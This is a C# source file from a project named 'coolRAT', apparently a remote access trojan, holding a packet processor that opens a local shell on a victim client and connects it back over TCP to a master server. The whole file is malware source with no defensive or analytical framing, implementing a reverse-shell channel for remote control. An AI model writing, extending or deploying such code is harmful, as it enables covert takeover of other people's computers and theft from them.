using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace coolRAT.Libs.PacketProcessors
{
    public class ConnectShellPacket_PacketProcessor
    {
        TcpConnection Connection;
        ConnectShellPacket Packet;
        Dictionary<Guid, Client> ConnectedClients;
        IPEndPoint MasterServer_Info;

        public ConnectShellPacket_PacketProcessor(TcpConnection connection, ConnectShellPacket packet, Dictionary<Guid, Client> connectedClients, IPEndPoint masterServer_Info)
        {
            Connection = connection;
            Packet = packet;
            ConnectedClients = connectedClients;
            MasterServer_Info = masterServer_Info;
        }

        // Not sure how to approach this

        public Shell Process()
        {
            if(!ConnectedClients.ContainsKey(Packet.ClientUniqueId))
            {
                ShellConnectedPacket result_fail = new ShellConnectedPacket(Packet.ClientUniqueId, Guid.Empty, false);
                Connection.SendPacket(result_fail);
                return null;
            }

            // Open a new local shell
            Shell shell = new Shell();

            // Connect shell pipe
            TcpConnection shell_conn = new TcpConnection();
            if(!shell_conn.Connect(MasterServer_Info.Address.ToString(), MasterServer_Info.Port))
            {
                ShellConnectedPacket result_fail = new ShellConnectedPacket(Packet.ClientUniqueId, Guid.Empty, false);
                Connection.SendPacket(result_fail);
                return null;
            }
            ConnectPipePacket connectPipePacket = new ConnectPipePacket(Packet.ClientUniqueId, PipeType.Shell);
            shell_conn.SendPacket(connectPipePacket);
            shell.Connection = shell_conn;

            ShellConnectedPacket result_success = new ShellConnectedPacket(Packet.ClientUniqueId, shell.UniqueId, true);
            shell_conn.SendPacket(result_success);
            return shell;
        }
    }
}
